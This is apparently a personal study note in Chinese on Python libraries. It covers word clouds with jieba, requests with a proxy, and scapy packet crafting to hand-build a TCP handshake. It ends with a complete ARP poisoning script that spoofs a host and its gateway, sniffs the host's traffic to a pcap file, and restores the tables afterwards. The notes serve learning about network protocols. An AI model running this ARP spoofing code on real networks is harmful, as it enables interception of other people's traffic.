Python
==============

词云
---------------

需要安装jieba、wordcloud
通过命令行直接生成词云的命令行::
 
 wordcloud_cli --text file_path.txt --imagefile wordcloud.png
 # 可以通过wordcloud_cli 进行更详细的调节，需要对文件分词，自带的分词效果较差
 # --fontfile path 支持中文
 # --mask file
 # --background white


通过jieba对中文分词处理::
 
 import jieba
 import wordcloud
 import matplotlib.pyplot as plt

 words = open(r'words.txt','rb').read().decode('utf-8')
 # print(words)
 cut_words = list(jieba.cut(words))
 cut_str = ' '.join(cut_words)
 print(cut_words)
 make = wordcloud.WordCloud(font_path=r'C:\Windows\Fonts\simkai.ttf')
 s = make.generate(cut_str)
 plt.imshow(s)
 plt.axis('off')
 plt.show()

requests库的使用
------------------

发送http请求::

 url = 'https://www.baidu.com'
 headers = {'user-agent':""}
 proxy = {"http":"89.17.37.218:52957"} # 使用代理
 response = requests.get(url,params={"wd":"中国"},proxies=proxy)
 # response.content 是原始页面的byte类型，没有解码
 # response.text 是requests 解码后的数据，解码方式是推测的，可能出错

 response = request.post(url,data) # post 请求

scapy库的使用
-------------------------
模拟三次握手::
 
 windows查看端口 netstat
 
 send(),在第三层发送数据包，但没有接收功能
 sendp(),在第二层发送数据包，同样没有接收功能

 sr(),在第三层发送数据包，有接收功能
 sr1(),在第三层发送数据包，有接收功能，但只接收第一个包
 srloop(),在第三层工作,循环发包

 srp()、srp1()、srploop()与sr,sr1,srloop类似,只是工作在第二层
 开始模拟时需要设置防火墙规则，防止操作系统发送RST
 iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.233.1 -j DROP
 
 flags = 2 为SYN扫描，半开式扫描
 recv=sr1(IP(dst="192.168.233.1")/TCP(dport=10020,sport=7777,flags="S"))
 ack = recv.ack
 seq = recv.seq
 
 发送ACK(flag = 16),完成三次握手！
 send(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,flags=16,seq=ack,ack=seq+1))

 flag为24（ACK = 16，PUSH = 8) 发送数据
 recv1 = sr(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,flags=24,seq=ack,ack=seq+1)/"hi", multi=1, timeout=10)
 如果多次发送数据需要每次对获取的seq+1,然后令ack等于seq+1

 flags=17, FIN（1） + ACK（16），进行连接终结
 recv1=srp1(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,seq=ack,ack=seq+1,flags=17))

arp投毒,抓包::

 from scapy.all import *
 import os
 import sys
 import threading
 import signal
 from scapy.layers.l2 import ARP, Ether

 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("restore target >>>>>>>")
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)
 def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
                               timeout=2,retry=10)
    a = 1
    for s,r in responses:
        print(s)
        print("$"*20)
        print(r)
        return r[Ether].src
 def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("begin to ARP poison")
    while True:
        try:
            send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac)) # 欺骗主机
            send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac)) # 欺骗网关
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    # print("stoped poison")
 if __name__ == '__main__':

    target_ip = '192.168.0.150'
    gateway_ip = '192.168.0.1'
    packet_count = 10
    conf.verb = 0
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    print(gateway_mac,target_mac)
    poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,
                                                                target_ip,target_mac))
    poison_thread.start()
    try:
        bpf_filter = "ip host %s"%target_ip
        packets_ = sniff(count=packet_count,filter=bpf_filter) # 抓包
        wrpcap("arp.pcap",packets_)
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac) # 恢复原先设置
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac) # 恢复原先设置

    poison_thread.join()
